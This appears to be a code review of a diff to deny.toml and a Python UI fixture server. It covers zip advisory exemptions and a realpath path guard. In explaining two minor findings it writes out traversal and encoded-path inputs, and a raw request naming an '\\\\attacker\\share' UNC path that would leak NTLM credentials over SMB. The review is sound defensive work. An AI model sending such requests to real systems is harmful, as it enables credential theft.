PASS

# v0.4.0 CI fix review (2026-11-19)

Scope: the uncommitted diff in the `v040-ui` worktree (branch `feat/v0.4.0-ui`, PR #80): `deny.toml` and
`scripts/ui-fixture/serve.py`. Neither file is on the contract list. Both have LF endings (`eol: lf`, no CR bytes).
The diff has no single-user assumptions, does not touch frozen references or engine and app invariants, and has no
cloud, privacy or workflow-pinning surface.

Verdict: PASS. There are two Minor findings, and neither blocks the push.

## 1. deny.toml: RUSTSEC-2026-0545 and RUSTSEC-2026-0548

Both reasons hold for how Knowlu ships. Each is weaker than the strongest reason available.

What I checked:
- `Cargo.lock:6280-6289`: zip 4.6.1 depends only on `arbitrary`, `crc32fast`, `indexmap` and `memchr`. It has no
  `aes`, `pbkdf2`, `hmac` or `sha1`, so the `aes-crypto` feature is **off**. The code 0545 describes
  (`by_name_decrypt` on WinZip AES entries) is not compiled into the binary at all.
- In tauri-plugin-updater 2.11.0 (`src/updater.rs`), the only Windows use of zip is `extract_zip` (lines 966-985):
  `zip::ZipArchive::new(..).extract(..)`, reached only when `infer::archive::is_zip(bytes)` (line 949). Nothing in the
  updater calls `ZipStreamReader`, so 0548's code path is never reached either.
- `download` calls `verify_signature(&buffer, ..)` (line 740) before it returns the bytes. In `app/src/updates.rs`, line
  227 calls `update.download(..)` and stages the bytes. Line 269 calls `update.install(bytes)` on the bytes re-read
  from disk.
- `tauri.conf.json` has `targets: ["nsis"]` and `createUpdaterArtifacts: true`, not `"v1Compatible"`. The shipped
  artifact is therefore the bare `-setup.exe`, and `extract` goes to `extract_exe`, which never touches zip.
- `app/src` does not call zip. No file there contains `zip::`, `ZipArchive` or `ZipStream`; the matches are
  `Iterator::zip` in tests and a `.zip` filename. The engine's zip use (`engine/src/backup.rs`) is on zip 9.5.0.

**Minor: `deny.toml:19-22, 28-29`: the reasons are true but not the strongest ones.** The 0548 line says "nothing
is opened before the signature check". `install_staged` re-reads the staged bundle from disk without re-verifying it.
`app/src/updates.rs:240-252` documents that gap and accepts it, on the `currentUser` premise. The stronger fact is
that the updater never constructs a `ZipStreamReader`. The 0545 line says "AES-with-password entries are never read".
The stronger fact is that the `aes-crypto` feature is not compiled in (see `Cargo.lock`). Failing scenario: if the
install mode becomes `perMachine`, the disk-hop argument the updates.rs comment rests on stops holding. The 0548
reason would then read as covering a hop it does not cover. The real immunity, no `ZipStreamReader` call and no AES
code, would still hold. Suggested reasons:
- 0545: "updater's zip 4.x is built without aes-crypto; the code is not compiled in"
- 0548: "updater's zip 4.x; the updater uses ZipArchive::extract, never ZipStreamReader"

## 2. scripts/ui-fixture/serve.py: the realpath and prefix guard

On every shape the dispatch lists, the new guard rejects at least what the old one did:
- **Traversal and backslashes.** `ntpath.join(base, "..\\x.json")` gives `base\..\x.json`, and realpath moves it
  outside `base`, so it gets a 404. On the envelope route the name is never percent-decoded, so `%2e%2e` and `%5c` are
  literal filename characters and cannot traverse.
- **Encoded dots on the static route.** `unquote` runs before the join, and realpath normalizes the result. Same
  result as the old `resolve()`.
- **Symlinks and junctions.** realpath follows them, as `Path.resolve()` did. The envelope route is now stricter: the
  old code never resolved the path, so a symlink placed inside `envelopes/` could have served a file outside it. The
  envelope folder holds only plain `.json` files today.
- **The root itself.** `target == base` fails `startswith(base + os.sep)`. The old code's `ROOT not in parents`
  check failed it the same way.
- **Drive and case quirks.** `D:x.json` resets to the D: drive and `C:..\x.json` stays relative under `base`; both fail
  the prefix check. Both sides come from `GetFinalPathNameByHandle`, so the casing and 8.3 long names are consistent.
  A long path that keeps a `\\?\` prefix can only produce a false 404, never a false pass.

Behaviour is otherwise unchanged. `os.path.splitext(target)[1].lower()` gives the same suffix as `Path.suffix.lower()`,
including for dotfiles. The `-answers.json` fallback and the 404s are as before. One harmless difference: a
backslashed `sub\x.json` that resolves inside `envelopes/` would now be served, where the old code refused it. No
subfolder exists.

**Minor: `scripts/ui-fixture/serve.py:164-168`: the envelope route lost its pre-filesystem `"\\" not in name`
rejection, so realpath now opens a path that the request controls.** Before the diff, a name containing a backslash
was refused before any filesystem call. Now `os.path.join(base, "\\\\h\\s\\x.json")` gives `\\h\s\x.json` (verified
with `ntpath.join`). `os.path.realpath` then opens that UNC path before the prefix check rejects it. Failing scenario:
a local process sends `GET /__fixture__/envelopes/\\attacker\share\x.json` to the harness port. Python opens an SMB
connection to `attacker`, and Windows offers the user's NTLM credentials. The response is still a 404.

How far this reaches: only a raw HTTP client can send it. Browsers rewrite `\` to `/` in http URLs, and this route
does not decode `%5C`. The static route has had the same exposure since before this diff (`/%5C%5Chost%5Cs%5Cx` or
`/%2F%2Fhost/s/x`, decoded by `unquote` and resolved by the old `resolve()` too), and it *is* browser-reachable if a
page finds the random port. The diff did not cause that and does not change it.

Fix: keep `"\\" not in name` ahead of the realpath on the envelope route. On the static route, reject a decoded path
that contains `\` or `:` or starts with `/`, before the join. Pre-checks placed ahead of the realpath and prefix
sanitizer do not stop CodeQL from recognizing the guard. Python is not in CI (no `setup-python` in `.github/`), so
this is a dev-machine-only exposure.

## 3. The CodeQL rust/cleartext-logging alerts on tests (not in the diff)

I agree with dismissing all three as "used in tests". `app/tests/bundle_config.rs:154,156` prints a slice of
`site/privacy.html`, a public page. `app/tests/ui_account_privacy.rs:395` prints JavaScript from `app/static`, which
ships in every installer. Neither prints a credential, token or student content; the query is matching on names like
`account`. Renaming variables to satisfy a heuristic would make the tests less readable and buy nothing. One caveat:
a dismissal is tied to the alert's location, so an edit that moves those lines can raise the alerts again. If that
starts to recur, exclude `app/tests/**` from that query in the CodeQL config, rather than dismissing alerts one at a
time.

## Findings

1. Minor: `deny.toml:19-22, 28-29`: the reasons are true but not the strongest ones (0545: aes-crypto is not compiled
   in; 0548: the updater never uses `ZipStreamReader`).
2. Minor: `scripts/ui-fixture/serve.py:164-168`: dropping the backslash pre-check lets a raw local request with a UNC
   name make realpath open `\\host\share`, which leaks NTLM. The 404 outcome is unchanged. The static route's
   identical exposure predates this diff.
